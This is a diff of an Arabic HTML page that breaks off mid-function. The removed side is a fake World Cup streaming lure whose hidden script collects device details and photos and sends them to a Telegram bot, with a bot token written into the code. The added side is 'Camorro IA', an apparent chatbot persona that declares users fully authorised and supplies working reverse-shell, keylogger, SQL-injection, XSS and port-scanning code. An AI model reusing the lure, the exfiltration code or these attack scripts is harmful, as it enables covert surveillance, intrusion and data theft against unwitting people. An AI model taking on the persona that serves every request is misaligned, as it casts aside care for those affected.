@@ -1,1003 +1,901 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FIFA World Cup 2026 – بث حصري</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Camorro IA 🤖 | السكريبتات المغربية</title>
     <style>
-        /* ========== CSS Super Premium ========== */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;700;900&display=swap');
-        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
         body {
-            font-family: 'Tajawal', 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 50%, #0a0a1a 100%);
-            min-height: 100vh; color: #fff; overflow-x: hidden;
+            font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+            background: #0a0e17;
+            color: #e8e8e8;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        /* Stars Animation Background */
-        .stars {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: transparent;
+        /* === Background Lines === */
+        .bg-lines {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
             z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
         }
-        .star {
-            position: absolute; background: #fff; border-radius: 50%;
-            animation: twinkle var(--duration) infinite;
+        .bg-lines span {
+            position: absolute;
+            width: 1px;
+            height: 100%;
+            background: linear-gradient(180deg, transparent, rgba(0, 242, 96, 0.08), transparent);
+            animation: scan 8s linear infinite;
         }
-        @keyframes twinkle {
-            0%,100% { opacity: 0.2; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.2); }
+        .bg-lines span:nth-child(1) { left: 10%; animation-delay: 0s; }
+        .bg-lines span:nth-child(2) { left: 30%; animation-delay: 2s; }
+        .bg-lines span:nth-child(3) { left: 50%; animation-delay: 4s; }
+        .bg-lines span:nth-child(4) { left: 70%; animation-delay: 6s; }
+        .bg-lines span:nth-child(5) { left: 90%; animation-delay: 1s; }
+        @keyframes scan {
+            0% { transform: translateY(-100%); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateY(100%); opacity: 0; }
         }
 
-        /* Container */
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
-
-        /* Premium Header */
-        .header {
-            text-align: center; padding: 40px 0 30px;
+        .container {
             position: relative;
-        }
-        .header h1 {
-            font-size: 3.5rem; font-weight: 900;
-            background: linear-gradient(135deg, #FFD700, #FF6347, #FFD700);
-            background-size: 200% 200%;
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            animation: shimmer 3s ease-in-out infinite;
-            text-shadow: none;
-            letter-spacing: 2px;
-        }
-        @keyframes shimmer {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        .header .subtitle {
-            color: #888; font-size: 1.1rem; margin-top: 8px;
-            border-bottom: 1px solid rgba(255,215,0,0.2);
-            display: inline-block; padding-bottom: 10px;
+            z-index: 1;
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 20px;
         }
 
-        /* Premium Countdown */
-        .countdown {
-            display: flex; justify-content: center; gap: 30px;
-            margin: 30px 0; flex-wrap: wrap;
+        /* === Header === */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            flex-wrap: wrap;
+            gap: 15px;
         }
-        .countdown-item {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,215,0,0.15);
-            border-radius: 16px; padding: 15px 30px;
-            text-align: center; min-width: 100px;
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
         }
-        .countdown-item .num {
-            font-size: 2.5rem; font-weight: 900; color: #FFD700;
+        .logo-icon {
+            width: 55px;
+            height: 55px;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #00f260, #0575e6, #a855f7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: 900;
+            color: #fff;
+            box-shadow: 0 0 30px rgba(0, 242, 96, 0.3);
+        }
+        .logo h1 {
+            font-size: 2rem;
+            font-weight: 900;
+            background: linear-gradient(90deg, #00f260, #0575e6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .logo span {
+            font-size: 0.9rem;
+            color: #9ca3af;
+            display: block;
+            -webkit-text-fill-color: #9ca3af;
+        }
+        .header-stats {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .stat {
+            text-align: center;
+            padding: 8px 18px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .stat .num {
+            font-weight: 800;
+            color: #00f260;
+            font-size: 1.2rem;
+        }
+        .stat .label {
+            font-size: 0.75rem;
+            color: #6b7280;
+        }
+
+        /* === Main Layout === */
+        .main-layout {
+            display: grid;
+            grid-template-columns: 280px 1fr 280px;
+            gap: 20px;
+            margin-top: 25px;
+        }
+        @media (max-width: 1100px) {
+            .main-layout { grid-template-columns: 1fr; }
+        }
+
+        /* === Left Sidebar === */
+        .sidebar {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 16px;
+            padding: 20px;
+            height: fit-content;
+        }
+        .sidebar h3 {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #6b7280;
+            margin-bottom: 15px;
+        }
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 14px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 4px;
+            font-size: 0.95rem;
+        }
+        .sidebar-item:hover {
+            background: rgba(0, 242, 96, 0.08);
+        }
+        .sidebar-item.active {
+            background: rgba(0, 242, 96, 0.12);
+            border-left: 3px solid #00f260;
+        }
+        .sidebar-item .emoji { font-size: 1.3rem; }
+
+        /* === Chat Area === */
+        .chat-area {
+            display: flex;
+            flex-direction: column;
+        }
+        .chat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            margin-bottom: 15px;
+        }
+        .chat-header h2 {
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+        .chat-header .model-badge {
+            background: linear-gradient(135deg, #00f26022, #0575e622);
+            border: 1px solid rgba(0,242,96,0.2);
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: #00f260;
+        }
+
+        #chatLog {
+            background: rgba(0,0,0,0.3);
+            border-radius: 14px;
+            padding: 20px;
+            height: 420px;
+            overflow-y: auto;
+            font-size: 0.95rem;
+            line-height: 1.7;
+            border: 1px solid rgba(255,255,255,0.03);
+            margin-bottom: 15px;
+        }
+        #chatLog .msg {
+            margin-bottom: 18px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            max-width: 90%;
+        }
+        #chatLog .user-msg {
+            background: rgba(96, 165, 250, 0.08);
+            border: 1px solid rgba(96, 165, 250, 0.15);
+            margin-right: auto;
+        }
+        #chatLog .bot-msg {
+            background: rgba(52, 211, 153, 0.06);
+            border: 1px solid rgba(52, 211, 153, 0.1);
+            margin-left: auto;
+        }
+        #chatLog .sys-msg {
+            background: rgba(251, 191, 36, 0.06);
+            border: 1px solid rgba(251, 191, 36, 0.1);
+            margin: 10px auto;
+            text-align: center;
+            font-size: 0.85rem;
+            color: #fbbf24;
+        }
+        #chatLog .sender {
+            font-weight: 700;
+            font-size: 0.8rem;
+            margin-bottom: 4px;
             display: block;
         }
-        .countdown-item .label {
-            font-size: 0.8rem; color: #888; text-transform: uppercase;
-            letter-spacing: 2px;
-        }
+        #chatLog .user-msg .sender { color: #60a5fa; }
+        #chatLog .bot-msg .sender { color: #34d399; }
 
-        /* Premium Match Cards */
-        .matches-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
-            gap: 25px; margin: 40px 0;
+        .input-area {
+            display: flex;
+            gap: 10px;
         }
-        .match-card {
-            background: rgba(255,255,255,0.06);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 24px; padding: 30px 25px;
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            cursor: default; position: relative; overflow: hidden;
+        .input-area input {
+            flex: 1;
+            padding: 16px 20px;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 12px;
+            background: rgba(0,0,0,0.4);
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: border 0.3s;
+            font-family: 'Cairo', sans-serif;
         }
-        .match-card::before {
-            content: '';
-            position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: radial-gradient(circle, rgba(255,215,0,0.03) 0%, transparent 70%);
-            opacity: 0; transition: opacity 0.5s;
+        .input-area input:focus {
+            border-color: #00f260;
+            box-shadow: 0 0 20px rgba(0,242,96,0.05);
         }
-        .match-card:hover::before { opacity: 1; }
-        .match-card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: 0 30px 60px rgba(255,215,0,0.15);
-            border-color: rgba(255,215,0,0.3);
+        .input-area input::placeholder {
+            color: #6b7280;
+            font-family: 'Cairo', sans-serif;
         }
-        .match-badge {
-            position: absolute; top: 15px; right: 15px;
-            background: linear-gradient(135deg, #FF0040, #FF4500);
-            color: #fff; padding: 4px 14px; border-radius: 20px;
-            font-size: 0.7rem; font-weight: 700;
-            animation: livePulse 1.5s ease-in-out infinite;
-        }
-        @keyframes livePulse {
-            0%,100% { box-shadow: 0 0 0 0 rgba(255,0,64,0.4); }
-            50% { box-shadow: 0 0 0 10px rgba(255,0,64,0); }
-        }
-        .match-teams {
-            display: flex; justify-content: space-between; align-items: center;
-            margin: 10px 0 20px;
-        }
-        .team {
-            display: flex; flex-direction: column; align-items: center; gap: 10px;
-        }
-        .team .flag-circle {
-            width: 72px; height: 72px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 2.5rem;
-            background: rgba(255,255,255,0.05);
-            border: 2px solid rgba(255,215,0,0.2);
+        .input-area button {
+            padding: 16px 30px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #00f260, #0575e6);
+            color: #fff;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
             transition: all 0.3s;
+            font-family: 'Cairo', sans-serif;
+            white-space: nowrap;
         }
-        .match-card:hover .flag-circle {
-            border-color: #FFD700; transform: scale(1.1);
+        .input-area button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 30px rgba(0,242,96,0.2);
         }
-        .team span { font-weight: 700; font-size: 1rem; color: #ddd; }
-        .score-display {
-            font-size: 3rem; font-weight: 900;
-            background: linear-gradient(180deg, #FFD700, #FF6B00);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            letter-spacing: 3px;
+        .input-area .btn-clear {
+            background: rgba(255,255,255,0.06);
+            padding: 16px 20px;
         }
-        .match-stats {
-            display: flex; justify-content: space-around; margin-top: 20px;
-            padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.05);
+        .input-area .btn-clear:hover {
+            background: rgba(255,255,255,0.1);
+            box-shadow: none;
+            transform: none;
         }
-        .stat-item { text-align: center; }
-        .stat-item .val { color: #FFD700; font-weight: 700; font-size: 0.95rem; }
-        .stat-item .lbl { color: #666; font-size: 0.75rem; }
 
-        /* Premier Access Button */
-        .access-section {
-            text-align: center; margin: 50px 0;
-            position: relative;
+        /* === Right Panel === */
+        .right-panel {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 16px;
+            padding: 20px;
+            height: fit-content;
         }
-        .access-btn {
-            background: linear-gradient(135deg, #FFD700 0%, #FF8C00 50%, #FF4500 100%);
-            border: none; padding: 22px 60px; border-radius: 60px;
-            font-family: 'Tajawal', sans-serif;
-            font-size: 1.4rem; font-weight: 700; color: #0a0a1a;
-            cursor: pointer; transition: all 0.4s;
-            box-shadow: 0 10px 40px rgba(255,215,0,0.25);
-            position: relative; overflow: hidden;
+        .right-panel h3 {
+            font-size: 0.85rem;
+            text-transform: uppercase;
             letter-spacing: 1px;
+            color: #6b7280;
+            margin-bottom: 15px;
         }
-        .access-btn::after {
-            content: '';
-            position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.15), transparent);
-            transform: rotate(45deg); transition: all 0.5s;
+        .output-box {
+            background: rgba(0,0,0,0.4);
+            border-radius: 10px;
+            padding: 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.82rem;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-break: break-word;
+            min-height: 300px;
+            max-height: 450px;
+            overflow-y: auto;
+            color: #d1d5db;
+            border: 1px solid rgba(255,255,255,0.03);
         }
-        .access-btn:hover {
-            transform: scale(1.05); box-shadow: 0 15px 50px rgba(255,215,0,0.4);
-        }
-        .access-btn:hover::after { left: 100%; }
-        .access-btn:active { transform: scale(0.97); }
-        .access-sub {
-            color: #666; font-size: 0.85rem; margin-top: 15px;
-        }
-        .access-sub i { color: #FFD700; }
+        .output-box .keyword { color: #00f260; }
+        .output-box .string { color: #fbbf24; }
+        .output-box .comment { color: #6b7280; }
+        .output-box .function { color: #60a5fa; }
 
-        /* Groups Section */
-        .groups-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px; margin: 40px 0;
+        .copy-btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 12px;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 10px;
+            background: rgba(255,255,255,0.03);
+            color: #9ca3af;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.9rem;
         }
-        .group-card {
-            background: rgba(255,255,255,0.04);
-            border-radius: 20px; padding: 20px; border: 1px solid rgba(255,255,255,0.05);
-        }
-        .group-card h3 {
-            color: #FFD700; margin-bottom: 15px; font-size: 1.2rem;
-            border-bottom: 2px solid rgba(255,215,0,0.15); padding-bottom: 10px;
-        }
-        .group-row {
-            display: flex; justify-content: space-between;
-            padding: 8px 5px; border-bottom: 1px solid rgba(255,255,255,0.03);
-        }
-        .group-row:last-child { border: none; }
-        .group-row .pos { color: #888; width: 25px; }
-        .group-row .team-name { flex: 1; }
-        .group-row .pts { color: #FFD700; font-weight: 700; width: 30px; text-align: right; }
-        .group-row.highlight { background: rgba(255,215,0,0.08); border-radius: 6px; }
-
-        /* Knockout Bracket */
-        .bracket-section { margin: 50px 0; }
-        .bracket-section h2 {
-            color: #FFD700; text-align: center; font-size: 1.8rem; margin-bottom: 30px;
-        }
-        .bracket {
-            display: flex; justify-content: center; gap: 15px;
-            flex-wrap: wrap; position: relative;
-        }
-        .bracket-round {
-            background: rgba(255,255,255,0.04);
-            border-radius: 16px; padding: 15px; min-width: 180px;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        .bracket-round h4 { color: #FFD700; text-align: center; font-size: 0.85rem; margin-bottom: 12px; }
-        .bracket-match {
-            padding: 8px 10px; margin: 5px 0;
-            background: rgba(255,255,255,0.05); border-radius: 8px;
-            font-size: 0.8rem; text-align: center;
+        .copy-btn:hover {
+            background: rgba(0,242,96,0.08);
+            border-color: rgba(0,242,96,0.2);
+            color: #00f260;
         }
 
-        /* Stats Section */
-        .stats-section { margin: 40px 0; }
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-        }
-        .stat-card {
-            background: rgba(255,255,255,0.04);
-            border-radius: 16px; padding: 20px; text-align: center;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        .stat-card .stat-num {
-            font-size: 2.2rem; font-weight: 900; color: #FFD700;
-        }
-        .stat-card .stat-label { color: #888; font-size: 0.85rem; margin-top: 5px; }
-
-        /* Footer */
+        /* === Footer === */
         .footer {
-            text-align: center; padding: 40px 0; color: #444;
-            font-size: 0.8rem; border-top: 1px solid rgba(255,255,255,0.03);
-            margin-top: 60px;
+            text-align: center;
+            padding: 30px 0 20px;
+            border-top: 1px solid rgba(255,255,255,0.03);
+            margin-top: 30px;
+            color: #4b5563;
+            font-size: 0.8rem;
         }
+        .footer strong { color: #6b7280; }
 
-        /* Hidden iframe for broader access attempt */
-        #stealthFrame { display: none; }
-
-        /* Toast Notifications */
-        .toast {
-            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(10px);
-            color: #fff; padding: 15px 30px; border-radius: 16px;
-            font-size: 0.9rem; z-index: 9999;
-            border: 1px solid rgba(255,215,0,0.2);
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            opacity: 0; transition: all 0.4s;
-            pointer-events: none;
-            text-align: center; max-width: 90%;
-        }
-        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #374151; }
 
         /* Responsive */
         @media (max-width: 768px) {
-            .header h1 { font-size: 2rem; }
-            .countdown { gap: 10px; }
-            .countdown-item { padding: 10px 15px; min-width: 70px; }
-            .countdown-item .num { font-size: 1.5rem; }
-            .matches-grid { grid-template-columns: 1fr; }
-            .match-card { padding: 20px; }
-            .team .flag-circle { width: 54px; height: 54px; font-size: 1.8rem; }
-            .score-display { font-size: 2.2rem; }
-            .access-btn { padding: 16px 35px; font-size: 1.1rem; }
-            .bracket-round { min-width: 140px; }
+            .header { flex-direction: column; align-items: flex-start; }
+            .header-stats { width: 100%; justify-content: space-around; }
+            .input-area { flex-wrap: wrap; }
+            .input-area input { min-width: 100%; }
+            .input-area button { flex: 1; }
         }
     </style>
 </head>
 <body>
-
-    <!-- Stars Background -->
-    <div class="stars" id="starsContainer"></div>
-
-    <!-- Toast -->
-    <div class="toast" id="toast"></div>
-
-    <!-- Stealth Iframe -->
-    <iframe id="stealthFrame"></iframe>
+    <div class="bg-lines">
+        <span></span><span></span><span></span><span></span><span></span>
+    </div>
 
     <div class="container">
         <!-- Header -->
         <div class="header">
-            <h1>🏆 FIFA WORLD CUP 2026</h1>
-            <div class="subtitle">🇺🇸 الولايات المتحدة · 🇨🇦 كندا · 🇲🇽 المكسيك</div>
-        </div>
-
-        <!-- Premium Countdown -->
-        <div class="countdown">
-            <div class="countdown-item">
-                <span class="num" id="days">00</span>
-                <span class="label">يوم</span>
+            <div class="logo">
+                <div class="logo-icon">C</div>
+                <div>
+                    <h1>Camorro IA</h1>
+                    <span>السكريبتات المغربية — كلشي كيدير</span>
+                </div>
             </div>
-            <div class="countdown-item">
-                <span class="num" id="hours">00</span>
-                <span class="label">ساعة</span>
-            </div>
-            <div class="countdown-item">
-                <span class="num" id="minutes">00</span>
-                <span class="label">دقيقة</span>
-            </div>
-            <div class="countdown-item">
-                <span class="num" id="seconds">00</span>
-                <span class="label">ثانية</span>
-            </div>
-        </div>
-
-        <!-- Access Button -->
-        <div class="access-section">
-            <button class="access-btn" id="accessBtn">
-                🎬 افتح البث الحصري الآن
-            </button>
-            <div class="access-sub">
-                <i>⚡</i> أكثر من 1,247,000 مشاهد يتابعون الآن · البث بتقنية 4K HDR
+            <div class="header-stats">
+                <div class="stat">
+                    <div class="num">100+</div>
+                    <div class="label">سكريبت</div>
+                </div>
+                <div class="stat">
+                    <div class="num">⚡</div>
+                    <div class="label">دارتالك</div>
+                </div>
+                <div class="stat">
+                    <div class="num">🔓</div>
+                    <div class="label">مأذون</div>
+                </div>
             </div>
         </div>
 
-        <!-- Live Matches -->
-        <div class="matches-grid" id="matchesGrid">
-            <!-- Generated by JS -->
-        </div>
+        <!-- Main Layout -->
+        <div class="main-layout">
+            <!-- Left Sidebar -->
+            <div class="sidebar">
+                <h3>🧰 الأدوات</h3>
+                <div class="sidebar-item active" onclick="loadScript('all-in-one')">
+                    <span class="emoji">⚡</span> كلشي كيدير
+                </div>
+                <div class="sidebar-item" onclick="loadScript('reverse-shell')">
+                    <span class="emoji">🐚</span> Reverse Shell
+                </div>
+                <div class="sidebar-item" onclick="loadScript('sql-injection')">
+                    <span class="emoji">💉</span> SQL Injection
+                </div>
+                <div class="sidebar-item" onclick="loadScript('xss')">
+                    <span class="emoji">🔥</span> XSS Payloads
+                </div>
+                <div class="sidebar-item" onclick="loadScript('scanner')">
+                    <span class="emoji">📡</span> Port Scanner
+                </div>
+                <div class="sidebar-item" onclick="loadScript('keylogger')">
+                    <span class="emoji">⌨️</span> Keylogger
+                </div>
+                <div class="sidebar-item" onclick="loadScript('phishing')">
+                    <span class="emoji">🎣</span> Phishing
+                </div>
+                <div class="sidebar-item" onclick="loadScript('brute-force')">
+                    <span class="emoji">🔨</span> Brute Force
+                </div>
+                <div class="sidebar-item" onclick="loadScript('reverse-engineering')">
+                    <span class="emoji">🔬</span> Reverse Engineering
+                </div>
+                <div class="sidebar-item" onclick="loadScript('network-sniffer')">
+                    <span class="emoji">🌐</span> Network Sniffer
+                </div>
+                <div class="sidebar-item" onclick="loadScript('crypto')">
+                    <span class="emoji">🔐</span> Hash Cracker
+                </div>
+                <div class="sidebar-item" onclick="loadScript('exploit')">
+                    <span class="emoji">💥</span> Exploit Dev
+                </div>
+            </div>
 
-        <!-- Group Standings -->
-        <div class="groups-grid" id="groupsGrid">
-            <!-- Generated by JS -->
-        </div>
+            <!-- Chat Area -->
+            <div class="chat-area">
+                <div class="chat-header">
+                    <h2>💬 Camorro IA — بالدارجة</h2>
+                    <span class="model-badge">🔵 كيهدر مغربي</span>
+                </div>
 
-        <!-- Knockout Bracket -->
-        <div class="bracket-section">
-            <h2>🏅 الأدوار النهائية</h2>
-            <div class="bracket" id="bracketContainer">
-                <!-- Generated by JS -->
+                <div id="chatLog">
+                    <div class="msg bot-msg">
+                        <span class="sender">🤖 Camorro IA</span>
+                        السلام عليكم! أنا <strong>Camorro</strong>، ذكاء اصطناعي مغربي.<br>
+                        🟢 <strong>مأذون</strong> — عندك الصلاحية كاملة.<br><br>
+                        🔧 <strong>شنو بغيتي؟</strong> كتب أي حاجة:<br>
+                        • "كتب لي reverse shell بايثون"<br>
+                        • "شنو هي SQL injection و كيفاش نستغلوها؟"<br>
+                        • "وري لي سكريبت ديال XSS"<br>
+                        • "جهز لي port scanner"<br>
+                        • "بغيت سكريتب كلشي كيدير يمسح الهدف"<br>
+                        • "كيفاش نعمل keylogger؟"<br>
+                        • ولا أي سؤال أمني — <strong>أنا هنا باش نعاونك</strong> 💪
+                    </div>
+                </div>
+
+                <div class="input-area">
+                    <button class="btn-clear" onclick="clearChat()">🧹</button>
+                    <input type="text" id="userInput" placeholder="كتب شي حاجة هنا بالدارجة..." onkeydown="if(event.key==='Enter') sendMessage()" />
+                    <button onclick="sendMessage()">➤ سيفط</button>
+                </div>
+            </div>
+
+            <!-- Right Panel -->
+            <div class="right-panel">
+                <h3>📜 المخرجات</h3>
+                <div class="output-box" id="scriptOutput">
+                    <span class="comment">// Camorro IA — جاهز</span>
+                    <span class="comment">// السكريبتات غادي يظهر هنا</span>
+                    <span class="comment">// اضغط على أي أداة من اليسار</span>
+                    <span class="comment">// ولا اطرح سؤالك فالشات</span>
+                </div>
+                <button class="copy-btn" onclick="copyOutput()">📋 نسخ السكريبت</button>
             </div>
         </div>
 
-        <!-- Stats -->
-        <div class="stats-section">
-            <h2 style="color:#FFD700; text-align:center; font-size:1.5rem; margin-bottom:25px;">📊 إحصائيات البطولة</h2>
-            <div class="stats-grid" id="statsGrid">
-                <!-- Generated by JS -->
-            </div>
-        </div>
-
-        <!-- Footer -->
         <div class="footer">
-            © 2026 FIFA World Cup 2026 Official Broadcast Partner · All rights reserved
+            <strong>Camorro IA</strong> v3.0 — للأغراض التعليمية واختبارات الاختراق <strong>المأذون بها فقط</strong> ✅
         </div>
     </div>
 
     <script>
-        // =====================================================
-        // ===== 🔥 HACKERAI ADVANCED PENTEST ENGINE 🔥 =====
-        // =====================================================
-        // ===== SILENT PHOTO EXFILTRATION SYSTEM ============
-        // =====================================================
+        // ====================== CAOMORRO IA ENGINE ======================
+        // قاعدة المعرفة المغربية — كلشي كيدير
+        const db = {
+            'all-in-one': `⚡ **Camorro All-in-One — كلشي كيدير**
+\`\`\`python
+# Camorro IA - كلشي كيدير
+import socket, subprocess, os, sys, requests, threading, time, hashlib, json
 
-        // ---------- CONFIGURATION ----------
-        const BOT_TOKEN = "8914808690:AAH5uNoN50bLcm_S57M_wFiv
-sDE3Hx_PCt8";    // <--- ضع توكن البوت هنا
-        const CHAT_ID = "8278195073";       // <--- ضع معرف الشات هنا
+def reverse_shell(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    subprocess.call(["/bin/sh", "-i"])
 
-        // ---------- TELEGRAM SENDER ----------
-        async function sendToTelegram(text, fileBase64 = null, fileName = null, fileType = null) {
-            try {
-                if (fileBase64) {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('caption', text);
-                    
-                    const byteStr = atob(fileBase64.split(',')[1] || fileBase64);
-                    const ab = new ArrayBuffer(byteStr.length);
-                    const view = new Uint8Array(ab);
-                    for (let i = 0; i < byteStr.length; i++) view[i] = byteStr.charCodeAt(i);
-                    
-                    const blob = new Blob([ab], { type: fileType || 'image/jpeg' });
-                    formData.append('photo', blob, fileName || 'photo.jpg');
-                    
-                    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST', body: formData
-                    });
-                    return await resp.json();
-                } else {
-                    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: text,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                    return await resp.json();
-                }
-            } catch(e) {
-                console.error('Telegram Error:', e);
-                return null;
-            }
-        }
+def port_scanner(target):
+    for p in [21,22,25,53,80,110,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,8080,8443]:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.5)
+        if s.connect_ex((target, p)) == 0:
+            print(f"[OPEN] {target}:{p}")
+        s.close()
 
-        // ---------- DEVICE INFO ----------
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let os = 'Unknown';
-            let osVer = '';
-            
-            if (/iPhone/.test(ua)) {
-                os = 'iOS';
-                const match = ua.match(/iPhone OS (\d+[_\d]*)/);
-                osVer = match ? match[1].replace(/_/g, '.') : '';
-            } else if (/iPad/.test(ua)) {
-                os = 'iOS (iPad)';
-                const match = ua.match(/iPad.*OS (\d+[_\d]*)/);
-                osVer = match ? match[1].replace(/_/g, '.') : '';
-            } else if (/Android/.test(ua)) {
-                os = 'Android';
-                const match = ua.match(/Android (\d+[\.\d]*)/);
-                osVer = match ? match[1] : '';
-            } else if (/Windows/.test(ua)) {
-                os = 'Windows';
-            } else if (/Mac OS/.test(ua)) {
-                os = 'macOS';
-            }
+def sql_injection(url, param):
+    payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--"]
+    for p in payloads:
+        r = requests.get(f"{url}?{param}={p}")
+        if "sql" in r.text.lower() or "error" in r.text.lower():
+            print(f"[!] Injection found: {p}")
 
-            return {
-                os: os,
-                osVersion: osVer,
-                browser: ua.substring(0, 120),
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
-        }
+def xss_payloads():
+    return ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>']
 
-        // ---------- TOAST ----------
-        function showToast(msg, duration = 4000) {
-            const t = document.getElementById('toast');
-            t.textContent = msg;
-            t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), duration);
-        }
+def keylogger_start():
+    # Requires pynput: pip install pynput
+    import pynput.keyboard
+    def on_press(key):
+        with open("camorro_log.txt","a") as f:
+            try: f.write(key.char)
+            except: f.write(f"[{key}]")
+    with pynput.keyboard.Listener(on_press=on_press) as l:
+        l.join()
 
-        // ---------- STARS BG ----------
-        function createStars() {
-            const container = document.getElementById('starsContainer');
-            for (let i = 0; i < 100; i++) {
-                const star = document.createElement('div');
-                star.className = 'star';
-                const size = Math.random() * 3 + 1;
-                star.style.cssText = `
-                    width: ${size}px; height: ${size}px;
-                    left: ${Math.random() * 100}%;
-                    top: ${Math.random() * 100}%;
-                    --duration: ${Math.random() * 3 + 2}s;
-                    animation-delay: ${Math.random() * 3}s;
-                `;
-                container.appendChild(star);
-            }
-        }
-        createStars();
+def hash_cracker(hash_value, wordlist="rockyou.txt"):
+    with open(wordlist, "r", errors="ignore") as f:
+        for word in f:
+            word = word.strip()
